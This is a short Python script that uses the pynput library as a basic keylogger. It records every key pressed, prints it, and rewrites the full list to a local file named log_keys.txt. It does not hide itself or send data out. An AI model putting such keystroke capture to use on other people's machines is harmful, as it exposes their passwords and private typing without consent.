# -*- coding: utf-8 -*-
"""
Created on Thu Oct  8 16:01:21 2020

@author: Fulltime_Me
"""

""" 
Imports 
"""

import pynput
from pynput.keyboard import Key, Listener

""" 
Set the Key list.
"""

keys = []

""" 
On press function.
"""

def on_press(key):
    global keys, count
    
    keys.append(key)
    
    print("{0} pressed".format(key))
    
    write_file(keys)

"""
Write function.
"""

def write_file(keys):
    with open("log_keys.txt", "w") as f:
        for key in keys:
            f.write(str(key) + "\n")

"""
The End.
"""

def on_release(key):
    pass
    
with Listener(on_press= on_press, on_release= on_release) as listener:
   listener.join()